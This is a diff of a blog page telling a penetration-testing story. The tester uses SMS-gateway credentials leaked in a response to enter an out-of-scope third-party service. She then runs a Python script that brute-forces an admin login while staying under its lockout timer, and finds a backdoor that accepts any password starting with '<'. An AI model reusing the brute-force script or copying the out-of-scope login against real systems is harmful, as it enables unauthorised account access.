@@ -11,7 +11,7 @@
   <link href="/css/style-classic.css"></link>
   
   
-  <link rel="stylesheet" href="/css/style.min.9d91cbb32c96c334ae7b38c3d99d30727e0836e1182125cc5f007d215f0b9e59.css">
+  <link rel="stylesheet" href="/css/style.min.eeb61b3f25f73088eb3aeb02bc61f28d33975f447fc5649add3b83c10059c331.css">
   
 
   
@@ -221,20 +221,20 @@
 <p>And that&rsquo;s when it started happening&hellip;. Sometimes, there is this hunch that one needs to follow. It&rsquo;s comming from deep inside, our subconscious might find something worthy even before consciousness sees it. Jung called it <em>intuition</em>. It&rsquo;s really a powerfull thing that&rsquo;s needed so much in the work such as Rachel&rsquo;s. And that&rsquo;s the story where several hunched helped.</p>
 <p>&lsquo;- <em>Ok</em>, - Racheled murmured under her nose, - <em>What if I check the requests and responses manually in Burp? The website is very small, there should not be too many requests there.</em></p>
 <p>That was a fair shot, because indeed, the Burp logs were not extensive at all. She was scrolling down the requests and responses when suddenly something caught her eye 👁.</p>
-<p>' - <em>OMG! Is this a password or something?</em> - she wondered. Indeed it was! - <em>But I don&rsquo;t remember entering anything&hellip; Wait, a password in the <strong>response</strong>? What&rsquo;s going on?</em></p>
-<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="err">HTTP/</span><span class="mi">2</span> <span class="mi">200</span> <span class="err">OK</span>
-<span class="err">Content-Type:</span> <span class="err">application/json;</span> <span class="err">charset=UTF</span><span class="mi">-8</span>
-<span class="err">Server:</span> <span class="err">nginx</span>
-<span class="err">Content-Length:</span> <span class="mi">174</span>
-<span class="err">Connection:</span> <span class="err">close</span>
-<span class="err">X-Powered-By:</span> <span class="err">PHP</span> <span class="mi">7</span>
-
-<span class="p">{</span>
-  <span class="nt">&#34;success&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
-  <span class="nt">&#34;url&#34;</span><span class="p">:</span> <span class="s2">&#34;http://smski.co.co.uk/send_message?login=Hogwarts&amp;password=Bnh175Lkajnfnf9&amp;from=Hogwarts&amp;to=4409877890&amp;text=OTPis123456&#34;</span>
-  
-<span class="p">}</span>
-</code></pre></div><p>&lsquo;- <em>Noway this could work!</em> - she exclaimed. However, she copied the URL and pressed Enter. And she <em>saw</em> the SMSki website. As a quick research revealed, it was used to send SMS messages in large quantities. There was also what looked like a login form in the corner. She typed <code>Hogwarts</code> as login and <code>Bnh175Lkajnfnf9</code> as password and&hellip; got inside the Hogwarts&rsquo; personal profile on this website. She was bewildered.</p>
+<p>&rsquo; - <em>OMG! Is this a password or something?</em> - she wondered. Indeed it was! - <em>But I don&rsquo;t remember entering anything&hellip; Wait, a password in the <strong>response</strong>? What&rsquo;s going on?</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">HTTP/</span><span class="mi">2</span> <span class="mi">200</span> <span class="err">OK</span>
+</span></span><span class="line"><span class="cl"><span class="err">Content-Type:</span> <span class="err">application/json;</span> <span class="err">charset=UTF</span><span class="mi">-8</span>
+</span></span><span class="line"><span class="cl"><span class="err">Server:</span> <span class="err">nginx</span>
+</span></span><span class="line"><span class="cl"><span class="err">Content-Length:</span> <span class="mi">174</span>
+</span></span><span class="line"><span class="cl"><span class="err">Connection:</span> <span class="err">close</span>
+</span></span><span class="line"><span class="cl"><span class="err">X-Powered-By:</span> <span class="err">PHP</span> <span class="mi">7</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;success&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;url&#34;</span><span class="p">:</span> <span class="s2">&#34;http://smski.co.co.uk/send_message?login=Hogwarts&amp;password=Bnh175Lkajnfnf9&amp;from=Hogwarts&amp;to=4409877890&amp;text=OTPis123456&#34;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>&lsquo;- <em>Noway this could work!</em> - she exclaimed. However, she copied the URL and pressed Enter. And she <em>saw</em> the SMSki website. As a quick research revealed, it was used to send SMS messages in large quantities. There was also what looked like a login form in the corner. She typed <code>Hogwarts</code> as login and <code>Bnh175Lkajnfnf9</code> as password and&hellip; got inside the Hogwarts&rsquo; personal profile on this website. She was bewildered.</p>
 <p>&lsquo;- <em>Oh my gosh&hellip; . That&rsquo;s a littly out of scope. I don&rsquo;t want to get myself into trouble. But I have to check it thoroughly. What can I do? Can I send messages? Read them? Do I need some additional authorisation to do so?</em></p>
 <p>Long story short, no, she didn&rsquo;t. The website was surprisingly primitive in terms of security and looked like the one from the earliest days of the Web. She had figured this out when she saw the login request sent via GET. Cool! 😎</p>
 <blockquote>
@@ -252,11 +252,11 @@
 <p><img src="images/adminlogin2.png" alt="adminlogin2"></p>
 <p>&lsquo;- <em>What if I try to turn on the VPN in the browser</em>, - was a valid assumption, - <em>And this&hellip;this&hellip;. wait for it&hellip; doesn&rsquo;t work. Damn. I don&rsquo;t understand, how do they check my IP? Is it an HTTP header like X-Forwarded-From or something?</em></p>
 <p>Rachel checked the HTTP headers of the request in Burp.</p>
-<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="err">GET</span> <span class="err">/admin/sign/in</span>
-<span class="err">Host:</span> <span class="err">hogwarts.co.uk</span>
-<span class="err">Connection:</span> <span class="err">close</span>
-<span class="err">...</span>
-</code></pre></div><p>&lsquo;- <em>Don&rsquo;t see anything of that sort. That&rsquo;s so weird&hellip; .</em> - Rachel double-checked the request but got the same results. She even checked whether there is a <code>Referer</code> header that might be giving her out, but there wasn&rsquo;t. It started getting dark outside and she had already missed her chance to savour the last rays of the sun 🌞. There was no point rushing out now. She decided to postpone the investigation of this picky behaviour for later and check the Burp&rsquo;s automated scan results. Nothing <em>severe</em>, <em>high</em> or even <em>medium</em> was found. But&hellip;</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">GET</span> <span class="err">/admin/sign/in</span>
+</span></span><span class="line"><span class="cl"><span class="err">Host:</span> <span class="err">hogwarts.co.uk</span>
+</span></span><span class="line"><span class="cl"><span class="err">Connection:</span> <span class="err">close</span>
+</span></span><span class="line"><span class="cl"><span class="err">...</span>
+</span></span></code></pre></div><p>&lsquo;- <em>Don&rsquo;t see anything of that sort. That&rsquo;s so weird&hellip; .</em> - Rachel double-checked the request but got the same results. She even checked whether there is a <code>Referer</code> header that might be giving her out, but there wasn&rsquo;t. It started getting dark outside and she had already missed her chance to savour the last rays of the sun 🌞. There was no point rushing out now. She decided to postpone the investigation of this picky behaviour for later and check the Burp&rsquo;s automated scan results. Nothing <em>severe</em>, <em>high</em> or even <em>medium</em> was found. But&hellip;</p>
 <p>&lsquo;- <em>Wait, what is that?</em> - Rachel noticed that <a href="https://hogwarts.co.uk">https://hogwarts.co.uk</a> was not the only domain used by the website. Some pages belonged to the <a href="https://market.hogwarts.co.uk">https://market.hogwarts.co.uk</a>. It seemed that the crawler followed several links that lead to that domain or may be she clicked on those links herself. She checked the URLs for the subdomain and it turned out, that that was a page listing magic services provided to the muggles.</p>
 <p>&lsquo;- <em>Here is a crazy thought&hellip; Does this subdomain has the admin page as well?</em> - Rachel wondered typing <a href="https://market.hogwarts.co.uk/admin/sign/in">https://market.hogwarts.co.uk/admin/sign/in</a> in the address bar and pressing Enter.</p>
 <p>&lsquo;- <em>Ha!</em> - Rachel exclaimed outloud in a guine excitement and surprise. - <em>Look! This page is accessible on this domain as well! Great. What if I try to enter a password?</em></p>
@@ -267,66 +267,66 @@
 <p>She scrolled down the list of the most common passwords, trying to put a score to the most likely options. Then, she had her list of the next 5 options to try. When the 5 minute timeout was over, she tried all of them. But what a surprise it was to get &hellip; a 5 minute timeout again!</p>
 <p>&lsquo;- <em>Ha, that&rsquo;s going to make things easier,</em> - Rachel thought 💭 to herself.</p>
 <p>Burp&rsquo;s Intruder didn&rsquo;t have an option to send 5 requests every 5 minutes, so she felt a need to write a custom script in Python.</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># importing the requered librariess</span>
-<span class="kn">import</span> <span class="nn">requests</span> 
-<span class="kn">import</span> <span class="nn">time</span> 
-<span class="kn">import</span> <span class="nn">warnings</span> 
-<span class="kn">import</span> <span class="nn">sys</span>
-
-
-<span class="n">warnings</span><span class="o">.</span><span class="n">filterwarnings</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
-<span class="n">delay_coeff</span> <span class="o">=</span> <span class="mi">1</span>
-<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;https://market.hogwarts.ru/admin/sign/in&#34;</span>
-<span class="c1"># headers required for the POST request to the admin URL</span>
-<span class="n">hdrs</span> <span class="o">=</span> <span class="p">{</span> 
-    <span class="s2">&#34;Host&#34;</span><span class="p">:</span> <span class="s2">&#34;market.hogwarts.ru&#34;</span><span class="p">,</span>
-    <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span>
-    <span class="s2">&#34;Content-Length&#34;</span><span class="p">:</span> <span class="s2">&#34;162&#34;</span><span class="p">,</span>
-    <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="s2">&#34;https://market.hogwarts.ru&#34;</span><span class="p">,</span>
-<span class="p">}</span>
-
-<span class="n">passwords</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/Users/rachelgreen/projects/hogwarts/oracle_passwords.txt&#34;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
-<span class="n">attempts</span> <span class="o">=</span> <span class="mi">1</span>
-
-<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">passwords</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
-    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;====================================&#34;</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;This is an attempt </span><span class="se">\033</span><span class="s2">[1;33;40m #&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">attempts</span><span class="p">))</span>
-    <span class="n">username</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-    <span class="n">password</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
-    <span class="c1"># after each 5th password entered, sleep for 310 seconds</span>
-    <span class="k">if</span> <span class="n">attempts</span> <span class="o">%</span> <span class="mi">5</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">310</span><span class="o">*</span><span class="n">delay_coeff</span><span class="p">)</span>
-    <span class="c1"># min content length without the password and login fields</span>
-    <span class="n">content_len</span> <span class="o">=</span> <span class="mi">148</span>
-    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
-            <span class="s2">&#34;LoginForm[username]&#34;</span> <span class="p">:</span> <span class="n">username</span><span class="p">,</span>
-            <span class="s2">&#34;LoginForm[password]&#34;</span> <span class="p">:</span> <span class="n">password</span>
-    <span class="p">}</span>
-    <span class="c1"># add the size of the password and login to the Content Type</span>
-    <span class="n">added_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
-    <span class="n">content_len</span> <span class="o">+=</span> <span class="n">added_length</span>
-    <span class="c1"># update the Content-Length header</span>
-    <span class="n">hdrs</span><span class="p">[</span><span class="s2">&#34;Content-Length&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">content_len</span><span class="p">)</span>
-
-    <span class="c1"># send the request</span>
-    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">post_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">hdrs</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
-		<span class="c1"># In case she gets a &#34;Too many attempts error&#34;, she will have to extend the delay before the next 5 passwords are sent</span>
-    <span class="k">if</span> <span class="s2">&#34;Too many&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[1;35;40m The delay coefficient is too small&#34;</span><span class="p">)</span>
-        <span class="n">delay_coeff</span> <span class="o">+=</span> <span class="mf">0.5</span> <span class="c1"># increment the coefficient in order to extend the sleep time</span>
-        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="o">*</span><span class="mi">6</span><span class="p">)</span> <span class="c1"># wait for 6 minutes just to be sure </span>
-    <span class="k">elif</span> <span class="s2">&#34;Incorrect username or password.&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[1;31;40m The username {} or password {} is wrong!&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
-        <span class="c1"># Since there are only two types of messages possible that Rachel has discovered, anything else can potentially be a success and will need to reviewed EVEN if it is not.</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[1;32;40m Success! The login is: {}, and the password is: {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span> 
-        <span class="c1"># if something looks different from the above messages, that could be either a success or some other error that could give some insight into what&#39;s the password could be. That&#39;s why she&#39;s breaking the loop.</span>
-        <span class="k">break</span>
-    <span class="n">attempts</span> <span class="o">+=</span> <span class="mi">1</span>
-</code></pre></div><p>Rachel looked from the window outside and the warm motherly breath of the spring gently petted her cheek. She took a deep breath, her lungs 🫁 filled with fresh evening air and she felt some dizziness and composure raising inside.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># importing the requered librariess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span> 
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span> 
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">warnings</span> 
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">filterwarnings</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delay_coeff</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;https://market.hogwarts.ru/admin/sign/in&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># headers required for the POST request to the admin URL</span>
+</span></span><span class="line"><span class="cl"><span class="n">hdrs</span> <span class="o">=</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Host&#34;</span><span class="p">:</span> <span class="s2">&#34;market.hogwarts.ru&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Length&#34;</span><span class="p">:</span> <span class="s2">&#34;162&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="s2">&#34;https://market.hogwarts.ru&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">passwords</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/Users/rachelgreen/projects/hogwarts/oracle_passwords.txt&#34;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">attempts</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">passwords</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;====================================&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;This is an attempt </span><span class="se">\033</span><span class="s2">[1;33;40m #&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">attempts</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># after each 5th password entered, sleep for 310 seconds</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">attempts</span> <span class="o">%</span> <span class="mi">5</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">310</span><span class="o">*</span><span class="n">delay_coeff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># min content length without the password and login fields</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content_len</span> <span class="o">=</span> <span class="mi">148</span>
+</span></span><span class="line"><span class="cl">    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;LoginForm[username]&#34;</span> <span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;LoginForm[password]&#34;</span> <span class="p">:</span> <span class="n">password</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># add the size of the password and login to the Content Type</span>
+</span></span><span class="line"><span class="cl">    <span class="n">added_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content_len</span> <span class="o">+=</span> <span class="n">added_length</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># update the Content-Length header</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hdrs</span><span class="p">[</span><span class="s2">&#34;Content-Length&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">content_len</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># send the request</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">post_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">hdrs</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="c1"># In case she gets a &#34;Too many attempts error&#34;, she will have to extend the delay before the next 5 passwords are sent</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;Too many&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[1;35;40m The delay coefficient is too small&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">delay_coeff</span> <span class="o">+=</span> <span class="mf">0.5</span> <span class="c1"># increment the coefficient in order to extend the sleep time</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="o">*</span><span class="mi">6</span><span class="p">)</span> <span class="c1"># wait for 6 minutes just to be sure </span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="s2">&#34;Incorrect username or password.&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[1;31;40m The username </span><span class="si">{}</span><span class="s2"> or password </span><span class="si">{}</span><span class="s2"> is wrong!&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Since there are only two types of messages possible that Rachel has discovered, anything else can potentially be a success and will need to reviewed EVEN if it is not.</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[1;32;40m Success! The login is: </span><span class="si">{}</span><span class="s2">, and the password is: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl">        <span class="c1"># if something looks different from the above messages, that could be either a success or some other error that could give some insight into what&#39;s the password could be. That&#39;s why she&#39;s breaking the loop.</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="n">attempts</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span></code></pre></div><p>Rachel looked from the window outside and the warm motherly breath of the spring gently petted her cheek. She took a deep breath, her lungs 🫁 filled with fresh evening air and she felt some dizziness and composure raising inside.</p>
 <p>&lsquo;- <em>I think, I need a short randevouz in the park</em>, - she said to herself. - <em>The list of passwords is huge and I don&rsquo;t have any reason to rush. Besides, it could do me good, would reload my brain 🧠. I am sure I will sleep like a dog 🐕.</em></p>
 <p>The lights went off, the door slammed behind her and the little MacBook and the python script went on in Alliance, on and on, until the last <em>if</em> clause broke the loop&hellip; . But what was it? Admin page? What were the login and password?</p>
-<p>Rachel got back home 15 minutes 🕒 later after the script had terminated. An almoust endless row of red <em>&ldquo;The username {} or password {} is wrong!&quot;</em> was diluted with a modest green success message. Rachel managed to get her mind off the project completely this evening and that is why she didn&rsquo;t notice.</p>
+<p>Rachel got back home 15 minutes 🕒 later after the script had terminated. An almoust endless row of red <em>&ldquo;The username {} or password {} is wrong!&rdquo;</em> was diluted with a modest green success message. Rachel managed to get her mind off the project completely this evening and that is why she didn&rsquo;t notice.</p>
 <p>The next morning Rachel started with a cup of green tea and a croissant. She was dreaming of a cupcake though. The croissant was old and dry, it was obvious that its best time was over, it had become just food. When she finished her breakfast, she remembered, that she forgot about the script running.</p>
 <p>&lsquo;- <em>OMG! I hope, I have not broken anything!</em> - she exclaimed and rushed to the laptop. - <em>Could it be&hellip; really? Success? What was the password? Em&hellip; Wait, what?</em></p>
 <p>She had been staring at the screen for several minutes. It did not make any sense. Both the login and password were <code>&lt;BLANK&gt;</code> (litterally). It seemed that in the list of passwords there were lots of this <code>&lt;BLANK&gt;</code>s either for a login or password or both. Of course, it was intended that the <code>&lt;BLANK&gt;</code>  is actually an empty string. But how are you going to put it in the document and keep the structure? She tried to use the above mentioned credentials to login and indeed, did not receive neither <em>&ldquo;Too many attempts&rdquo;</em>, nor <em>&ldquo;The password or login is wrong&rdquo;</em>. Instead, a blank page with a website header was there. No errors, but not an admin page either.</p>
@@ -336,13 +336,13 @@
 <p>She tried several other logins with the <code>&lt;BLANK&gt;</code> password and got the same result as before with an empty page. She then tried <code>admin</code> with <code>&lt;BLANK&gt;</code> again and was again redirected to the login panel. And then she felt this whisper again: <em>Try using <code>&lt;BLANK</code> instead. Who knows?</em></p>
 <p>&lsquo;- <em>OMG, this also works!!!</em> - it was hard to keep the emotions inside. She started deleting characters from the end and kept getting the same results as before. A frivolous admin page was there again, heartily welcoming anyone even distantly familiar. At some point, Rachel was left with just a <code>&lt;</code> which also worked fine. <code>&gt;</code> on the other hand was not satisfying for the system.</p>
 <p>&lsquo;- <em>Is it like a bookmark or a backdoor in the code?</em> - Rachel didn&rsquo;t see any other possible reasons other rather than similar to code below:</p>
-<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">...</span>
-<span class="k">if</span> <span class="p">(</span><span class="n">login</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span> <span class="ow">and</span> <span class="n">password</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;&lt;&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">login</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span> <span class="ow">and</span> <span class="n">password</span> <span class="o">==</span> <span class="s2">&#34;somerealpass&#34;</span><span class="p">:</span>
-  <span class="k">return</span> <span class="n">adminpage</span>
-<span class="k">else</span><span class="p">:</span>
-  <span class="k">print</span><span class="p">(</span><span class="s2">&#34;Incorrect username or password.&#34;</span>
-<span class="o">...</span>
-</code></pre></div><p>She informed the client right away and out of pure curiosity asked for a code snippet that was responsible for authentication. Turned out that there indeed was something like the one above, some fired developer saught its final revenge. He could have uploaded a webshell using this admin control panel! May be he had&hellip; But that, dear readers, is whole other scope&hellip; .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">login</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span> <span class="ow">and</span> <span class="n">password</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;&lt;&#34;</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">login</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span> <span class="ow">and</span> <span class="n">password</span> <span class="o">==</span> <span class="s2">&#34;somerealpass&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">adminpage</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Incorrect username or password.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span></code></pre></div><p>She informed the client right away and out of pure curiosity asked for a code snippet that was responsible for authentication. Turned out that there indeed was something like the one above, some fired developer saught its final revenge. He could have uploaded a webshell using this admin control panel! May be he had&hellip; But that, dear readers, is whole other scope&hellip; .</p>
 
   </div>
 </article>
@@ -375,7 +375,7 @@
   
 
   
-  <script type="text/javascript" src="/js/scripts.min.1237ff71925bb8625c97a9af8db4c54525258bedfd7c47493daaff723bea755e.js"></script>
+  <script type="text/javascript" src="/js/scripts.min.bafc052229b4b40bf03c477d31c5cdd9352ece8afbadf35ab97ed14495098fc9.js"></script>
   
 
   
